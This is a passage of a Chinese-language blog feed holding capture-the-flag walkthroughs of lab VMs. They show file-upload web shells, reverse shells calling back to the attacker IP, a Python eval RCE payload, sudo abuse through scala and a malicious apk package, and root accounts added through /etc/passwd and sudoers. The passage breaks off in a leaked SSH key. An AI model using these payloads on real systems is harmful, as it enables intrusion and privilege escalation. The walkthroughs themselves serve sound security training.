┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.192 08:00:27:d7:eb:a4       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:fb:d6:c6       VMware, Inc.

4 responded
```

扫描结果显示，目标靶机的 IP 地址为 `192.168.205.192`。

## 2. 端口与服务扫描

确定目标 IP 后，使用 `nmap` 对其进行全端口扫描，以发现所有开放的 TCP 端口及其上运行的服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.192
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 08:48 EDT
Nmap scan report for 192.168.205.192
Host is up (0.00019s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:D7:EB:A4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.47 seconds
```

结果显示目标开放了两个常见端口：

*   **22/tcp**: SSH 服务，用于远程登录。
*   **80/tcp**: HTTP 服务，即标准 Web 服务。

# 二、Web 探索与漏洞发现

## 1. 域名与子域名发现

访问 `http://192.168.205.192` 是一个电商网站。尝试注册一个账号并登录后，在 “我的订单” 页面发现了一个 PHP 报错信息。

![image-20250717205207123](https://7r1UMPHK.github.io/image/20250717205207346.webp)

&gt; **Warning**: Undefined array key 'role' in **/var/www/chabaidao.dsz/customer/includes/header.php** on line **35**

这个报错泄露了网站的根目录路径，并揭示了其域名为 `chabaidao.dsz`。我们将此域名添加到本地 `hosts` 文件中。

```bash
# 在 /etc/hosts 文件中添加
192.168.205.192 chabaidao.dsz
```

接着，使用 `wfuzz` 对该域名进行子域名爆破。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ wfuzz -c -u 'http://chabaidao.dsz/' -H 'HOST:FUZZ.chabaidao.dsz' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 764

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000000002:   200        610 L    1372 W     21027 Ch    'mail - mail'
...
```

发现一个子域名 `mail.chabaidao.dsz`，同样将其添加到 `hosts` 文件。

```bash
# 更新 /etc/hosts 文件
192.168.205.192 chabaidao.dsz mail.chabaidao.dsz
```

## 2. 隐写术分析

访问 `http://mail.chabaidao.dsz/`，页面上只有一个可以播放音乐文件 `music.wav`。

![image-20250717205551792](https://7r1UMPHK.github.io/image/20250717205552105.webp)

通过查看源代码下载 `music.wav` 文件，并且与网络上的原曲（刘瑞琦-两三句）进行二进制比较 (`cmp -l`)，发现两个文件在许多字节上仅相差 1。这强烈指向了 **最低有效位（LSB）隐写**。

&gt; **什么是 LSB 隐写？**
&gt;
&gt; LSB（Least Significant Bit）隐写是一种将秘密信息嵌入到数字媒体（如图像或音频）中的技术。它通过修改每个样本（或像素）数据中“最不重要”的比特（即最低位）来隐藏信息。由于这种修改对原始文件的影响极小，人耳或肉眼很难察夜。

我们编写一个 Python 脚本来提取 `music.wav` 数据部分所有字节的最低有效位，并将它们重新组合成一个文件。

```python
import sys

def ext(fin, fout):
    try:
        with open(fin, 'rb') as f:
            data = f.read()
        
        bits = [str(b &amp; 1) for b in data[44:]]
        
        b_arr = bytearray()
        for i in range(0, len(bits) - len(bits) % 8, 8):
            b_arr.append(int(''.join(bits[i:i+8]), 2))
            
        with open(fout, 'wb') as f:
            f.write(b_arr)
            
        print(f'提取完成 -&gt; {fout}')

    except Exception as e:
        print(f'错误: {e}')

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print('用法: python3 extract.py &lt;输入wav&gt; &lt;输出文件&gt;')
        sys.exit(1)
    
    ext(sys.argv[1], sys.argv[2])
                                  
```

执行脚本后，我们得到了一个名为 `a` 的文件。使用 `strings` 命令查看这个文件的内容，在开头部分发现了一组凭据。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ python3 lsb.py music.wav a
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ strings a |head -n 10 
admin@liverpool12
z       K&gt;p
aLPu
pQV=i
$1]4
UDPs
$$@D
n&gt;h'2
gu]@
TeHE$Zd
```

我们成功找到了隐藏的密码：`admin@liverpool12`。

# 三、初始访问

## 1. 后台登录与文件上传

使用 `admin@`chabaidao.dsz 邮箱和刚找到的密码 `admin@liverpool12` 成功登录了主站 `http://chabaidao.dsz/` 的后台。

![image-20250717225850690](https://7r1UMPHK.github.io/image/20250717225851014.webp)

后台个人资料页面有一个头像上传功能，提示只允许上传图片格式。这是一个典型的突破口。我们采用以下步骤绕过限制：

1.  准备一个蚁剑的ant.php文件，将其改名为ant.png进行上传(php反弹shell无法有效执行)

&gt; ```
&gt; ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
&gt; └─$ cat ant.png
&gt; &lt;?php eval($_POST['ant']); ?&gt;
&gt; ```

1.  使用 Burp Suite 拦截文件上传的请求。
2.  将请求中的文件名从 `ant.png` 修改为 `ant.php`。
3.  发送修改后的请求，即可成功上传 `any.php`。
4.  上传成功，查看头像源码获得url。

5.  使用蚁剑进行连接。

![image-20250717230617743](https://7r1UMPHK.github.io/image/20250717230617972.webp)

## 2. 反弹 Shell

在攻击机（Kali）上监听端口：

```bash
nc -lvnp 8888
```

在蚁剑的虚拟终端弹shell回去kali，方便操作。

攻击机成功接收到连接，获得了 `www-data` 用户的 Shell。为方便后续操作，升级为功能齐全的 TTY。

```bash
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm  
export TERM=xterm  
export SHELL=/bin/bash  
stty rows 24 columns 80
```

# 四、权限提升

## 1. 提权至 welcome (PATH 劫持)

获得了 `www-data` 的 Shell 后，首先检查 `sudo` 权限。

```bash
www-data@Chabaidao:/tmp$ sudo -l
...
User www-data may run the following commands on Chabaidao:
    (welcome) NOPASSWD: /home/welcome/write
www-data@Chabaidao:/tmp$ cat /home/welcome/write 
#!/bin/bash

# 检查参数数量
if [ $# -lt 2 ]; then
    echo '用法: $0 &lt;文件路径&gt; &lt;要写入的内容&gt;'
    exit 1
fi

file_path='$1'
content='$2'

# 检查文件是否存在
if [ ! -f '$file_path' ]; then
    echo '错误：文件 '$file_path' 不存在，无法写入。'
    exit 2
fi

# 写入内容
echo '$content' &gt; '$file_path'
echo '内容已成功写入到 $file_path'
```

`www-data` 用户可以免密以 `welcome` 用户的身份执行 `/home/welcome/write` 脚本。可以看出wirte脚本是以welcome用户实现写入的一个脚本，并且通过进程监控发现 `welcome` 用户会定时执行 `/home/welcome/chabaidao` 脚本，该脚本会读取 `/home/welcome/myfile` 的内容作为 `PATH` 环境变量。这是典型的 **PATH 环境变量劫持** 提权路径。

1. 在 `www-data` 用户可写的目录（如 `/dev/shm`）下创建一个名为 `file` 的恶意脚本，内容为反弹 Shell 命令，并赋予执行权限。

   ```bash
   www-data@Chabaidao:/tmp$ cd /dev/shm/  
   www-data@Chabaidao:/dev/shm$ cat &gt; file &lt;&lt; 'EOL'
   &gt; #!/bin/bash
   &gt; bash -c '/bin/bash -i &gt;&amp; /dev/tcp/192.168.205.128/8888 0&gt;&amp;1'
   &gt; EOL
   www-data@Chabaidao:/dev/shm$ chmod +x file
   ```

2. 利用 `www-data` 的 `sudo` 权限，以 `welcome` 身份执行 `write` 脚本，将我们的恶意脚本所在目录 `/dev/shm` 添加到 `/home/welcome/myfile` 定义的 `PATH` 变量的最前面。

   ```bash
   www-data@Chabaidao:/dev/shm$ echo '/dev/shm/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games' &gt; /tmp/a
   www-data@Chabaidao:/dev/shm$ sudo -u welcome /home/welcome/write /home/welcome/myfile '$(cat /tmp/a)'
   ```

3. 在攻击机上监听 8888 端口，等待定时任务执行。当 `chabaidao` 脚本执行时，它会使用我们篡改后的 `PATH`，从而优先执行了 `/dev/shm/file`，我们就获得了 `welcome` 用户的 Shell。

## 2. 提权至 root (Scala Sudo 提权)

拿到 `welcome` 用户的 Shell 后，再次检查 `sudo` 权限。

```bash
welcome@Chabaidao:~$ sudo -l
...
User welcome may run the following commands on Chabaidao:
    (ALL) NOPASSWD: /usr/bin/scala
```

`welcome` 用户可以免密以 `root` 权限执行 `scala`。我们可以利用 `scala` 的交互式解释器来执行任意系统命令。

1. 以 `root` 权限启动 `scala` 解释器。

   ```bash
   sudo /usr/bin/scala
   ```

2. 在 `scala` 解释器中，使用 `:sh` 命令执行一个 shell 命令，为 `/bin/bash` 添加 SUID 权限位。

   ```scala
   Welcome to Scala 2.11.12 ...
   Type in expressions for evaluation. Or try :help.
   
   scala&gt; :sh chmod +s /bin/bash
   res0: scala.tools.nsc.interpreter.ProcessResult = `chmod +s /bin/bash` (0 lines, exit 0)
   
   scala&gt; :quit
   ```

3. 退出 `scala` 后，执行 `bash -p` 来利用 SUID 位，获得一个 `euid=0` 的 root 权限 Shell。

   ```bash
   welcome@Chabaidao:~$ bash -p
   bash-5.0# id
   uid=1000(welcome) gid=1000(welcome) euid=0(root) egid=0(root) groups=0(root),1000(welcome)
   bash-5.0# whoami
   root
   bash-5.0#echo 'b:$1$AydoDDh4$tEky6m30.0nY3HZ8FgoGI0:0:0::/root:/bin/bash' &gt;&gt; /etc/passwd
   bash-5.0#su b
   Password: abcdefg
   root@Chabaidao:~# id
   uid=0(root) gid=0(root) groups=0(root)
   root@Chabaidao:~# cat /home/welcome/user.txt /root/root.txt 
   flag{user-12fc204edeae5b57713c5ad7dcb97d39}
   flag{root-12fc204edeae5b57713c5ad7dcb97d39}
   ```

成功提权至 root，渗透测试完成。sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_chabaidao.html</guid><pubDate>Fri, 18 Jul 2025 01:58:31 +0000</pubDate></item><item><title>内部_ajpsvr</title><link>https://7r1UMPHK.github.io/post/nei-bu-_ajpsvr.html</link><description>![image-20250716205953078](https://7r1UMPHK.github.io/image/20250716205953466.webp)

![image-20250716210011392](https://7r1UMPHK.github.io/image/20250716210011546.webp)

哈哈，整个活，补些wp

# 一、信息收集与服务探测

## 1. 主机发现

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.190 08:00:27:b0:70:3d       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:fb:d6:c6       VMware, Inc.

4 responded
```

扫描结果显示，IP 地址为 192.168.205.190

## 2. 端口与服务扫描

确定目标 IP 后，使用 nmap 对其进行全端口扫描，以发现所有开放的 TCP 端口及其上运行的服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ nmap -p- 192.168.205.190
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-16 09:01 EDT
Nmap scan report for 192.168.205.190
Host is up (0.00026s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8010/tcp open  xmpp
```

结果显示目标开放了三个端口：

- **22/tcp**: SSH 服务，通常用于远程登录。
- **80/tcp**: HTTP 服务，即标准 Web 服务。
- **8010/tcp**: nmap 初步识别为 xmpp，但需要进一步确认。

# 二、Web 探索与 AJP 代理

## 1. 初探 80 端口

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl 192.168.205.190     
&lt;html&gt;
&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;center&gt;&lt;h1&gt;403 Forbidden&lt;/h1&gt;&lt;/center&gt;
&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
                
```

使用 gobuster 进行目录爆破也未发现任何有价值的路径

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ gobuster dir -u http://192.168.205.190 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.190
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 1102795 / 1102800 (100.00%)
===============================================================
Finished
===============================================================
                                                    
```

## 2.8010 端口与 AJP

情况有点不对，看看8010是什么服务

```bash
PORT     STATE SERVICE VERSION
8010/tcp open  xmpp?
| fingerprint-strings: 
|   GenericLines: 
|_    ajpy
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8010-TCP:V=7.95%I=7%D=7/16%Time=6877A304%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,8,'\x124\0\x04ajpy');
MAC Address: 08:00:27:B0:70:3D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.81 seconds
                           
```

搜索了一下

![image-20250716210338088](https://7r1UMPHK.github.io/image/20250716210338218.webp)

通过搜索，我们了解到 8010 端口很可能运行着 **AJP (Apache JServ Protocol)** 服务。

&gt; [!Tip]
&gt;
&gt; **什么是 AJP？**
&gt;
&gt; AJP 是一个二进制协议，设计用于反向代理服务器（如 Apache HTTP Server）与后端的应用服务器（如 Apache Tomcat）之间进行通信。它比 HTTP 更高效，因为它在设计上减少了网络开销。我们不能像访问普通网页一样直接通过浏览器访问 AJP 服务。

为了与 AJP 服务交互，我们需要设置一个本地代理。这里我们使用 Apache httpd 服务器的 mod_proxy_ajp 模块，将我们本地的 8000 端口收到的 HTTP 请求转发到目标的 8010 端口。

**代理配置步骤：**

1. 启用 Apache 的相关代理模块：

   ```bash
   sudo apt-get install apache2
   sudo a2enmod proxy    
   sudo a2enmod proxy_http
   sudo a2enmod proxy_ajp        
   ```

2. 创建一个新的 Apache 站点配置文件 `/etc/apache2/sites-available/ajp-proxy.conf`：

   ```apache
   Listen 8000
   &lt;VirtualHost *:8000&gt;
       ProxyPass / ajp://192.168.205.190:8010/
       ProxyPassReverse / ajp://192.168.205.190:8010/
   &lt;/VirtualHost&gt;
   ```

3. 启用该站点并重启 Apache 服务：

   ```bash
   sudo a2ensite ajp-proxy.conf
   sudo systemctl restart apache2
   ```

配置完成后，访问我们自己机器的 `http://127.0.0.1:8000` (或 `http://192.168.205.128:8000`) 就相当于在访问目标 `192.168.205.190:8010` 上的 Web 应用了。

![image-20250716210721870](https://7r1UMPHK.github.io/image/20250716210722060.webp)

# 三、漏洞利用与初始访问

代理设置成功后，我们再次对代理后的地址进行目录爆破。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ gobuster dir -u http://192.168.205.128:8000 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip -t 64
===============================================================
/login                (Status: 200) [Size: 21]
/test                 (Status: 200) [Size: 12]
/backdoor             (Status: 200) [Size: 9]
===============================================================                             
```

这次我们发现了三个路径：`/login`, `/test`, `/backdoor`。

## 1. 登录页面爆破

经过测试发现，`/login` 路径接受一个 `password` 参数，并提示密码长度为 5。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl 'http://192.168.205.128:8000/login?password=test'
Password length is 5
```

这暗示我们需要爆破一个长度为 5 的密码。然而，直接使用常规字典爆破会遇到问题，因为后端对特殊字符的长度计算方式可能与我们预想的不同。正确的做法是对字典中的每一个密码进行 URL 编码。

1. 从 `rockyou.txt` 中筛选出所有长度为 5 的密码：

   ```bash
   grep -x '^.\{5\}$' /usr/share/wordlists/rockyou.txt &gt; 5z.txt
   ```

2. 使用 Python 对筛选后的字典进行 URL 编码：

   ```bash
   python3 -c 'import sys, urllib.parse; [print(urllib.parse.quote(line.strip())) for line in sys.stdin]' &lt; 5z.txt &gt; 5z_u.txt
   ```

3. 使用 `ffuf` 和编码后的字典进行爆破，并过滤掉返回内容为空的响应 (`--fs 0`)：

   ```bash
   ┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
   └─$ ffuf -u 'http://192.168.205.128:8000/login?password=FUZZ' -w 5z_u.txt --fs 0
   ...
   %21%40%23%24%25         [Status: 200, Size: 25, Words: 1, Lines: 1, Duration: 2ms]
   ...
   ```

我们找到了一个有效的密码 `%21%40%23%24%25`，它解码后是 `!@#$%`。

## 2. 后门与远程代码执行（RCE）

用找到的密码访问登录页面，返回了一个新的路径：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl 'http://192.168.205.128:8000/login?password=%21%40%23%24%25'
/backdoooooooooooooooooor
```

访问这个 `/backdoooooooooooooooooor` 路径，并尝试传入 `cmd` 参数执行命令。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl 'http://192.168.205.128:8000/backdoooooooooooooooooor?cmd=id'
&lt;built-in function id&gt;
```

返回结果 `&lt;built-in function id&gt;` 表明后端很可能使用了 Python 的 `eval()` 或类似函数来执行代码，并且没有导入 `os` 模块。为了执行系统命令，我们需要先导入 `os` 模块。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl 'http://192.168.205.128:8000/backdoooooooooooooooooor?cmd=__import__('os').popen('whoami').read()'
welcome
```

成功执行命令！我们当前的用户是 `welcome`。

## 3. 反弹 Shell

为了获得一个更稳定的交互式 Shell，我们利用这个 RCE 漏洞反弹一个 Shell 到我们的攻击机上。目标系统上存在 `busybox`，它集成了 `nc` (netcat) 工具。

1.  在攻击机（Kali）上监听 8888 端口：

```bash
nc -lvnp 8888
```

2.  通过 URL 发送反弹 Shell 的 payload（注意 `+` 在 URL 中会被视为空格，这里是 `busybox` 多功能二进制文件的用法）：

```bash
curl 'http://192.168.205.128:8000/backdoooooooooooooooooor?cmd=__import__('os').popen('busybox+nc+192.168.205.128+8888+-e+/bin/bash').read()'
```

攻击机成功接收到连接，我们获得了 `welcome` 用户的 Shell。

## 4. 稳定 Shell 并获取用户 Flag

为了更好的交互体验，我们将这个简陋的 Shell 升级为功能齐全的 TTY。

```bash
python -c 'import pty; pty.spawn('/bin/bash')'
Ctrl+Z
stty raw -echo; fg
reset xterm  
export TERM=xterm  
export SHELL=/bin/bash  
stty rows 24 columns 80
```

在 `welcome` 用户的家目录下，我们找到了第一个 flag。

```bash
localhost:~$ ls -al
...
-rw-r--r--    1 root     welcome         39 Jul 14 15:11 user.txt
localhost:~$ cat user.txt
flag{5a80870310e5a3bc10c00ef6d20a3cac}
```

# 四、权限提升

我们的目标是 root 权限，因此需要进行提权。

## 1. 提权至 superuser

在枚举系统时，发现一个只监听在本地 `127.0.0.1:5000` 的可疑服务。

```bash
localhost:~$ netstat -lntup
...
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -
...
localhost:~$ busybox nc 127.0.0.1 5000
Welcome to SignatureChain CTF over TCP!
Type 'view', 'submit', 'hint', or 'exit'
&gt; view
[
  {
    'index': 1,
    'sender': 'system',
    'recipient': 'alice',
    'amount': 100,
    'signature': '14ed219616014b683ae66d1ec2e098c84ff09695b33fff0a7652505e260be0aa',
    'note': '1'
  },
  {
    'index': 2,
    'sender': 'alice',
    'recipient': 'bob',
    'amount': 50,
    'signature': '08188ce485e280ba7d8c614a776a478d75ac2e985a535d1d126117ceb59ac952',
    'note': '2'
  }
]
&gt; hint
[Hint 1] Use 'view' to inspect part of the blockchain.
[Hint 2] The signature is just sha256(sender-&gt;recipient:amount).
[Hint 3] Try forging a valid signature with this knowledge.
[Hint 4] What if admin sent you 999 coins?
```

1. 使用 `view` 查看区块链的一部分。
2. 签名就是 `sha256(sender-&gt;recipient:amount)`。
3. 试着用这些知识伪造一个有效的签名。
4. 如果管理员给你发送了 999 枚硬币呢？

连接该服务后，发现是一个基于区块链签名的 CTF 挑战。

get不到，扒拉一下其他地方

```bash
localhost:~$ cd /opt/
localhost:/opt$ ls -al
total 16
drwxr-xr-x    4 root     root          4096 Jul 13 14:43 .
drwxr-xr-x   21 root     root          4096 Jul 13 18:06 ..
drwx--x--x    4 root     root          4096 Jul  9 16:53 containerd
drwxr-xr-x    2 root     root          4096 Jul 14 15:13 server
localhost:/opt$ cd server/
localhost:/opt/server$ ls -al
total 16
drwxr-xr-x    2 root     root          4096 Jul 14 15:13 .
drwxr-xr-x    4 root     root          4096 Jul 13 14:43 ..
-rw-r--r--    1 root     root            98 Jul 13 16:27 Dockerfile
-rw-r--r--    1 root     root          3667 Jul 13 16:21 server.py
localhost:/opt/server$ cat server.py
import socket
import threading
import json
import hashlib

FLAG = 'flag{superuser/f124cf868d5e3fa5a7de39f80a2f9a0e}'

# ... 此处省略大量代码 ...
```

有捷径，哈哈哈

代码中硬编码了一个 flag：`flag{superuser/f124cf868d5e3fa5a7de39f80a2f9a0e}`。根据 flag 的格式，我们可以推断出存在一个名为 `superuser` 的用户，其密码可能是 `f124cf868d5e3fa5a7de39f80a2f9a0e`。

使用此凭据切换用户成功。

```bash
localhost:/opt/server$ cd /home/
localhost:/home$ su superuser
Password: 
/home $ id
uid=1001(superuser) gid=1001(superuser) groups=300(abuild),1001(superuser)
```

## 2. 提权至 root

成为 `superuser` 后，检查 `sudo` 权限。

```bash
/home $ sudo -l
User superuser may run the following commands on localhost:
    (ALL) NOPASSWD: /sbin/apk
```

这是一个关键突破口！我们可以无需密码以 root 权限运行 `apk` 命令。`apk` 是 Alpine Linux 的包管理器。我们可以创建一个包含恶意安装后脚本的自定义 `.apk` 包，然后用 `sudo apk` 来安装它。该脚本将以 root 权限执行。

**提权步骤：**

1.  **创建恶意包工作目录和文件**
    *   `APKBUILD`：定义包名、版本等元信息。
    *   `pwn.post-install`：安装后要执行的脚本。我们可以在这里写入提权命令。

```bash
# 创建工作目录
mkdir /tmp/malicious-pkg
cd /tmp/malicious-pkg

cat &lt;&lt; 'EOF' &gt; APKBUILD
pkgname=pwn
pkgver=1.0.0
pkgrel=0
pkgdesc='pwn'
arch='noarch'
license='GPL'
install='pwn.post-install'
package() {
    mkdir -p '$pkgdir'
}
EOF

# 写入恶意安装后脚本 (例如：给予 superuser 完全的 sudo 权限)
cat &lt;&lt; 'EOF' &gt; pwn.post-install
#!/bin/bash
echo 'superuser ALL=(ALL:ALL) NOPASSWD: ALL' &gt;&gt; /etc/sudoers
EOF
```

2.  **生成签名密钥并构建包**
    `abuild` 工具需要签名密钥来构建包。

```bash
# 生成密钥对
abuild-keygen -a
# 构建包
abuild checksum
abuild -r
```

3.  **安装恶意包并提权**
    使用 `sudo apk add` 并加上 `--allow-untrusted` 选项来安装我们自己构建的未签名包。

```bash
sudo apk add --allow-untrusted /home/superuser/packages/tmp/x86_64/pwn-1.0.0-r0.apk 
```

安装过程中，`pwn.post-install` 脚本会被 root 执行，`superuser` 用户现在拥有了无密码执行任何 `sudo` 命令的权限。

```bash
localhost:/tmp/malicious-pkg$ sudo -l
User superuser may run the following commands on localhost:
    (ALL) NOPASSWD: /sbin/apk
    (ALL : ALL) NOPASSWD: ALL
```

4. **获取 Root Shell**

   ```bash
   localhost:/tmp/malicious-pkg$ sudo su
   /tmp/malicious-pkg # id
   uid=0(root) gid=0(root) groups=0(root),...
   ```

最后，在 root 的家目录下找到最终的 flag。

```bash
/tmp/malicious-pkg # cat /root/root.txt
flag{bd941f8fb8a7b5b1c34bd71a349d6d04}
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_ajpsvr.html</guid><pubDate>Thu, 17 Jul 2025 01:06:27 +0000</pubDate></item><item><title>内部_Sneak</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Sneak.html</link><description>![image-20250715221242195](https://7r1umphk.github.io/image/20250715221302013.webp)

继续补wp

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.186 08:00:27:d2:ee:10       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:fb:d6:c6       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.972 seconds (129.82 hosts/sec). 4 responded
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.186
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 10:13 EDT
Nmap scan report for 192.168.205.186
Host is up (0.00014s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:D2:EE:10 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.05 seconds
                                                                          
```

看web

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.186/ -v                                                                 
*   Trying 192.168.205.186:80...
* Connected to 192.168.205.186 (192.168.205.186) port 80
* using HTTP/1.x
&gt; GET / HTTP/1.1
&gt; Host: 192.168.205.186
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 200 OK
&lt; Date: Tue, 15 Jul 2025 14:14:11 GMT
&lt; Server: Apache/2.4.62 (Debian)
&lt; Last-Modified: Sat, 12 Apr 2025 01:53:17 GMT
&lt; ETag: '6-6328b152a4f57'
&lt; Accept-Ranges: bytes
&lt; Content-Length: 6
&lt; Content-Type: text/html
&lt; 
index
* Connection #0 to host 192.168.205.186 left intact
                                             
```

群里面的模板，那直接爆破目录吧

有个cms

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.186/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.186/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 280]
/.php                 (Status: 403) [Size: 280]
/index.html           (Status: 200) [Size: 6]
/cms                  (Status: 301) [Size: 316] [--&gt; http://192.168.205.186/cms/]
```

继续爆破

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.186/cms -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.186/cms
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 280]
/index.php            (Status: 500) [Size: 0]
/.php                 (Status: 403) [Size: 280]
/content              (Status: 301) [Size: 324] [--&gt; http://192.168.205.186/cms/content/]
/modules              (Status: 301) [Size: 324] [--&gt; http://192.168.205.186/cms/modules/]
/rss.php              (Status: 500) [Size: 0]
/core                 (Status: 301) [Size: 321] [--&gt; http://192.168.205.186/cms/core/]
/license.txt          (Status: 200) [Size: 2602]
/install              (Status: 301) [Size: 324] [--&gt; http://192.168.205.186/cms/install/]
/lib                  (Status: 301) [Size: 320] [--&gt; http://192.168.205.186/cms/lib/]
/config.php           (Status: 200) [Size: 0]
/styles               (Status: 301) [Size: 323] [--&gt; http://192.168.205.186/cms/styles/]
/robots.txt           (Status: 200) [Size: 104]
/.php                 (Status: 403) [Size: 280]
/.html                (Status: 403) [Size: 280]
/acp                  (Status: 301) [Size: 320] [--&gt; http://192.168.205.186/cms/acp/]
```

扒拉

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.186/cms/license.txt   
-----YEK ETAVIRP HSSNEPO NIGEB-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
sAdd/5SMN1KWatGo/1evq+7bfETGlpGM2U5Oi7e8nMF2/mDX2PJzAEYAAAQAAEwAAAAAhN
